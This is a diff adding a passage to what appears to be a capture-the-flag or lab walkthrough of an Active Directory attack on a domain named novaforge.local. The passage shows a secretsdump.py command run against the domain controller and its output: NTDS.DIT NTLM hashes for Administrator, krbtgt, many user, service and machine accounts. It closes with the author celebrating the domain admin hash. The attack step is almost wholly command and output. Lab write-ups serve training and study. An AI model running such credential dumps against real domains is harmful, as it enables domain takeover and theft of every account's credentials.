@@ -1239,5 +1239,38 @@ Now ill export it
 ```python
 secretsdump.py -k -no-pass dc.novaforge.local
 
-...[]...
+...[SNIP]...
+
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9413de945cfd8e7507cfea1e4445fce7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cf09388662ed3ae0b47b95693412f64b:::
+novaforge.local\john.mitchell:1103:aad3b435b51404eeaad3b435b51404ee:8fb478519cd9d78da59214c6107433ee:::
+novaforge.local\david.parker:1104:aad3b435b51404eeaad3b435b51404ee:98232800959b00fc3f5b5bbcf31f9b65:::
+novaforge.local\ryan.collins:1105:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novaforge.local\michael.turner:1106:aad3b435b51404eeaad3b435b51404ee:16db93f05d55ffcc859a9a51996cc401:::
+novaforge.local\jessica.morgan:1107:aad3b435b51404eeaad3b435b51404ee:27faf85abb2f7d31dd9b27ce9b72bc06:::
+novaforge.local\emily.carter:1108:aad3b435b51404eeaad3b435b51404ee:22ebb3d1e8cc22d5e63eb01497a2f2fa:::
+novaforge.local\daniel.brooks:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novaforge.local\alex.hughes:1110:aad3b435b51404eeaad3b435b51404ee:393e0cabafd4b1c594e371d73f365eec:::
+novaforge.local\frank.white:1111:aad3b435b51404eeaad3b435b51404ee:72a893b8f8071f2c9eb55858caa7d768:::
+novaforge.local\svc_it_admin:1112:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novaforge.local\david.cokx:1113:aad3b435b51404eeaad3b435b51404ee:a7feccee89b58d97e1c5f588a7429d47:::
+novaforge.local\john.doe:1114:aad3b435b51404eeaad3b435b51404ee:07d887be1816cf826111f807176bcde9:::
+novaforge.local\steve.wills:1115:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novaforge.local\chuck.harrys:1116:aad3b435b51404eeaad3b435b51404ee:a8021e1eac46d673e2479d635c6eeeb2:::
+novaforge.local\inbox:1117:aad3b435b51404eeaad3b435b51404ee:a90e5489d98d72437552e9b2b66bb6d4:::
+novaforge.local\steve.miller:1118:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novaforge.local\ethan.wright:1119:aad3b435b51404eeaad3b435b51404ee:2c7232dd219fe5397e34ad3091dad196:::
+novaforge.local\olivia.bennett:1120:aad3b435b51404eeaad3b435b51404ee:258baf6ee025fd80fc8dd040fd228a8f:::
+novaforge.local\noah.sanders:1121:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novaforge.local\liam.harrison:1122:aad3b435b51404eeaad3b435b51404ee:d1037a765c9e3d6bdcbbe7946e23281e:::
+m.lee:1129:aad3b435b51404eeaad3b435b51404ee:6ea15d2f02f27b69df1ad99268038779:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:9111664473f045e9a0c0e5cc35104023:::
+STORAGE$:1123:aad3b435b51404eeaad3b435b51404ee:72d049027fee0c6bb82b176a2834d83f:::
+
+...[SNIP]...
 ```
+
+I now have the domain admin NTLM hash!
+
